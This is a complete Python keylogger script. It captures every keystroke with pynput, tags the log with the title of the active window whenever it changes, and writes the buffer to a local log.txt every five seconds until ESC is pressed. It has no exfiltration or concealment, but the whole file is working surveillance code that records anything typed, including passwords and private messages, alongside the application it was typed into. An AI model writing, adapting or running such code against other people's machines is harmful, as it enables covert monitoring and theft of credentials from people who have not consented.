import threading
import os
from pynput import keyboard
import pygetwindow as gw

# --- Global Variables ---
log = ""  # Stores the keystrokes
path = os.path.join(os.getcwd(), "log.txt")
_report_timer = None  # This will hold our timer object

# --- Functions ---
active_window_title = ""

def processkeys(key):
    global log, active_window_title

    try:
        current_window = gw.getActiveWindow()
        if current_window and current_window.title != active_window_title:
            active_window_title = current_window.title
            log += f"\n--- [Window: {active_window_title}] ---\n"
    except Exception:
        # Can fail if no window is active, just ignore
        pass

    # Your existing key processing logic
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[BACKSPACE]"

def report(reschedule=True):
    """Saves the current log to the file and reschedules itself."""
    global log, _report_timer
    
    # Only write to the file if there's something to write
    if log:
        with open(path, "a") as logfile:
            logfile.write(log)
        print(f"--- Log saved ---") # For debugging
        log = ""  # Clear the log buffer after writing
    
    if reschedule:
        # Schedule the next call to report() in 5 seconds
        _report_timer = threading.Timer(5, report)
        _report_timer.start()

def on_release(key):
    """Handles key release events to stop the keylogger cleanly."""
    global _report_timer
    if key == keyboard.Key.esc:
        print("Escape key pressed. Shutting down.")
        if _report_timer:
            _report_timer.cancel()  # Stop the periodic reporting
        # Make a final report to save any remaining keystrokes
        report(reschedule=False)
        return False  # This stops the listener

# --- Main Execution ---

# Start the first report timer. This will run in 5 seconds.
# We also call it once without a timer to ensure the file is created.
report(reschedule=False) 
_report_timer = threading.Timer(5, report)
_report_timer.start()


# Set up and start the keyboard listener
keyboard_listener = keyboard.Listener(
    on_press=processkeys,
    on_release=on_release,
)

print("Keylogger started. Press ESC to stop.")
with keyboard_listener:
    keyboard_listener.join()

print("Keylogger stopped.")